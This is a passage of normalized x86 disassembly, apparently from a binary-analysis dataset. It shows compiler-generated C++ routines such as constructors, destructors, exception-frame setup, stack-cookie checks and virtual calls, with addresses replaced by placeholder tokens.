mov [ ebp - 0x14 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edx
mov ecx [ eax + 0x8 ]
mov [ ebp - 0xc ] ecx
mov edx [ eax + 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40cf10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_42396e
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40cf60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cf40
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40cf90
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_42168a
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x0
jne r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4216e6
mov edx [ rw-data ]
add edx 0x1
mov [ rw-data ] edx
mov eax [ ebp - 0xc ]
mov ecx [ rw-data ]
mov [ eax ] ecx
sub_40d020
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x4
or ecx 0xffffffff
[ eax ] ecx
dec ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40d050
push ebp
mov ebp esp
push 0xffffffff
push sub_43b558
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_40d280
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x10 ]
add edx 0x4
push edx
call sub_40cca0
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_40d0e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx ]
mov ecx [ edx ]
mov edx [ eax + 0x4 ]
call edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40d110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x1
call sub_42184c
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40d130
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov edx [ edx ]
mov ecx [ eax ]
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x0
push 0x1
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax ]
call edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
sub_40d180
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
add ecx 0x18
call sub_410300
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] r--data
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d1c0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
cmp edx [ ecx + 0xc ]
jae r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
movzx edx [ ecx + 0x14 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn 0x4
call sub_421846
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0xc ]
jae r-xdata
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub_40d250
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d0c0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40d2a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40d050
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40d330
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d2f0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40d360
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40d050
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40d3b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d390
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40d3e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
movsx eax [ edx + eax * 2 ]
movsx ecx [ ebp + 0x8 ]
and eax ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_40d420
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
call eax
mov esp ebp
pop ebp
retn 0x4
sub_40d440
push ebp
mov ebp esp
push 0xffffffff
push sub_43b3f8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_40d360
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
mov [ ecx ] r--data
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x10 ]
call sub_40d5d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_40d4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b9e4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push 0x18
call sub_42257f
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_40d180
push eax
lea ecx [ ebp - 0x58 ]
call sub_40cd70
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x10 ]
or edx 0x1
mov [ ebp - 0x10 ] edx
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x14 ]
call sub_40d440
mov [ ebp - 0x18 ] eax
jmp r-xdata
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x58 ]
call sub_40ce50
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ edx ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
and ecx 0x1
je r-xdata
sub_40d5a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_40d610
mov ecx [ ebp - 0x4 ]
call sub_40d390
mov esp ebp
pop ebp
retn
sub_40d5d0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40cec0
mov ecx [ ebp - 0x4 ]
add ecx 0x8
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
mov esp ebp
pop ebp
retn 0x4
sub_40d610
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
call sub_422732
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
push edx
call sub_422732
add esp 0x4
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
push eax
call j_sub_422732
add esp 0x4
sub_40d670
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
movzx ecx [ ebp + 0x8 ]
push ecx
call sub_421a82
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40d6a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
push ecx
call sub_421a82
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
sub_40d6e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
movzx ecx [ ebp + 0x8 ]
push ecx
call sub_421b7f
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40d710
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
push ecx
call sub_421b7f
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
sub_40d760
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
call sub_424fc0
add esp 0xc
mov eax [ ebp + 0xc ]
mov esp ebp
pop ebp
retn 0xc
sub_40d7a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
call sub_424fc0
add esp 0xc
mov eax [ ebp + 0xc ]
mov esp ebp
pop ebp
retn 0x10
sub_40d7d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d5a0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40d820
push ebp
mov ebp esp
push 0xffffffff
push sub_43b5e8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_40ccb0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
mov [ ecx ] r--data
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
mov ecx [ ebp + 0xc ]
mov [ edx + 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_40cb60
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
sub_40d8a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d8d0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40d900
push ebp
mov ebp esp
push 0xffffffff
push sub_43b588
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ edx ]
push ecx
mov ecx [ ebp - 0x10 ]
call sub_40d820
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov edx [ ebp - 0x10 ]
mov [ edx ] r--data
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_40d980
push ebp
mov ebp esp
sub esp 0x58
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0x17
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
and ecx [ eax + 0x10 ]
jne r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
and edx [ ecx + 0x10 ]
and edx 0x4
je r-xdata
push 0x0
push 0x0
call sub_42569b
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
and ecx [ eax + 0x10 ]
and ecx 0x2
je r-xdata
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_40d800
add esp 0x8
push eax
push r--data
lea ecx [ ebp - 0x30 ]
call sub_40d900
push r--data
lea ecx [ ebp - 0x30 ]
push ecx
call sub_42569b
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x1c ]
push ecx
call sub_40d800
add esp 0x8
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_40d900
push r--data
lea edx [ ebp - 0x58 ]
push edx
call sub_42569b
push 0x1
lea edx [ ebp - 0x14 ]
push edx
call sub_40d800
add esp 0x8
push eax
push r--data
lea ecx [ ebp - 0x44 ]
call sub_40d900
push r--data
lea eax [ ebp - 0x44 ]
push eax
call sub_42569b
jmp r-xdata
sub_40dab0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_40da90
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40db40
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0xc ] ecx
mov edx [ eax + 0x24 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_40db80
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40d0e0
mov edx [ ebp - 0x4 ]
or edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40dbc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
push ecx
call sub_421cf3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_40dc00
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x201
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x6
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] 0x0
mov [ edx + 0x24 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x2c ] 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40da70
push 0x4
call sub_42257f
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
call sub_40dd70
mov ecx [ ebp - 0x8 ]
call sub_40d110
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x30 ] eax
mov esp ebp
pop ebp
retn
sub_40dcb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40dce0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40dd00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40dd30
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40dd30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40cf10
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov ecx [ edx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov [ edx + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40dd90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40dbc0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40de00
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
call sub_423b8d
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x4 ]
mov [ ecx ] dl
mov al 0x1
xor al al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40de30
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
movsx ecx [ ebp + 0x8 ]
push ecx
call sub_423c86
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40de70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
push edx
call sub_423e67
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40deb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_410410
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_410670
mov esp ebp
pop ebp
retn
sub_40dee0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_40df10
sub_40df10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40df40
mov eax [ ebp - 0x4 ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x3c ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40df40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x2c ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40df80
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_4017f0
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_410070
lea ecx [ ebp - 0x20 ]
call sub_401830
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x1
mov esp ebp
pop ebp
retn 0x1c
sub_40e000
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_40e030
push 0x1
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_40e050
mov esp ebp
pop ebp
retn 0x4
sub_40e0d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40e1a0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b4c4
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x18
call sub_40bd50
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x10 ]
add ecx 0x30
call sub_40bd50
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x10 ]
add ecx 0x48
call sub_40bd50
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x10 ]
add ecx 0x60
call sub_40bd50
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x10 ]
add ecx 0x78
call sub_40bd50
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_40e240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x78
call sub_40bdc0
mov ecx [ ebp - 0x4 ]
add ecx 0x60
call sub_40bdc0
mov ecx [ ebp - 0x4 ]
add ecx 0x48
call sub_40bdc0
mov ecx [ ebp - 0x4 ]
add ecx 0x30
call sub_40bdc0
mov ecx [ ebp - 0x4 ]
add ecx 0x18
call sub_40bdc0
mov ecx [ ebp - 0x4 ]
call sub_40bdc0
mov esp ebp
pop ebp
retn
sub_40e290
push ebp
mov ebp esp
push 0xffffffff
push sub_43b82c
mov eax [ fs : 0x0 ]
push eax
